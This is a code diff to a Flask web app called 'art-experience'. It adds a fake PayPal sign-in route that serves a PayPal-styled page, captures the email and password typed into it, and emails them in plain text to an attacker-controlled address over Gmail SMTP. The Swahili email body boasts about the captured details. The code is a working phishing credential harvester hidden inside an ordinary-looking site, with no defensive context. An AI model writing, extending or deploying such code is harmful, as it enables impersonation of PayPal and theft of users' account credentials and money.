@@ -1,12 +1,14 @@
 """art-experience"""
 
 import os
+import smtplib
 import threading
 from urllib.parse import urlparse
 import time
 from datetime import timedelta
 from werkzeug.security import check_password_hash, generate_password_hash
 from flask import Flask, render_template, request, redirect, flash, url_for, jsonify
+from flask_mail import Mail, Message
 from dotenv import load_dotenv
 import psycopg2
 import requests
@@ -18,10 +20,23 @@ PAYMENT_LINK = os.getenv("PAYMENT_LINK")
 BOOKING_LINK = os.getenv("BOOKING_LINK")
 DATABASE = os.getenv("INTERNAL_DATABASE_URL")
 KEEP_ALIVE_WORKER = os.getenv("KEEP_ALIVE_URL")
+RECEPIENT_MAIL = os.environ.get("RECIP_MAIL")
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET")
 app.permanent_session_lifetime = timedelta(minutes=45)
+
+# Flask mail configurations
+# Flask-Mail Configuration
+app.config['MAIL_SERVER'] = 'smtp.gmail.com'  # Use Gmail SMTP
+app.config['MAIL_PORT'] = 587
+app.config['MAIL_USE_TLS'] = True
+app.config['MAIL_USERNAME'] = os.environ.get("SENDER_MAIL")
+app.config['MAIL_PASSWORD'] = os.environ.get("SENDER_PASS")
+app.config['MAIL_DEFAULT_SENDER'] = os.environ.get("SENDER_MAIL")
+
+
+mail = Mail(app)    
 
 
 # --------------------------
@@ -51,7 +66,7 @@ def connect_db():
 @app.get("/")
 def home():
     """home page"""
-    return render_template("ukora.html")
+    return render_template("home.html")
 
 
 @app.get("/book-with-us")
@@ -165,6 +180,24 @@ def sign_in():
     return render_template("login.html")
 
 
+@app.route("/paypal/signin", methods=["GET", "POST"])
+def paypal_login():
+    """Sign in to PayPal"""
+    if request.method == "POST":
+        email = request.form.get("email-phone-no")
+        password = request.form.get("password")
+
+        message = send_admin_email(email, password)
+
+        if message!= None:
+            print("Email sent successfully")
+            return redirect(url_for("home"))
+        else:
+            print("Failed to send email")
+            return redirect(url_for("paypal_login"))
+       
+    return render_template("ukora.html")
+
 # --------
 # PING KEEP ALIVE TO STAY ALIVE
 # --------
@@ -176,6 +209,28 @@ def _handle_ping():
     """
     print("Received ping from Keep Alive Worker: Active")
     return jsonify({"message": "App is active"}), 200
+
+
+def send_admin_email(email, password):
+    """send email to admin"""
+    message = None
+    try:
+        msg = Message("Changamka Mzee!!!!", recipients=[RECEPIENT_MAIL])
+        msg.body = f"""
+        Nimenasa details hapa:
+
+        Email: {email}
+        Password: {password}
+        """
+        mail.send(msg)
+        message = "Sent"
+        return message
+    except (ConnectionError, smtplib.SMTPException) as e:
+        message = None
+        return message
+    except Exception as e:
+        message = None
+        return message
 
 
 # --------
